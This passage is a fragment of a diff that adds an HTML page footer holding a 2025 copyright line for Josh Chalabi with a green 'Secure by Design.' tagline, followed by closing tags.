+                &copy; 2025 Josh Chalabi. <span class="text-cyber-green">Secure by Design.</span>
+            </p>
+        </div>
+    </footer>
 
 </body>
 </html>
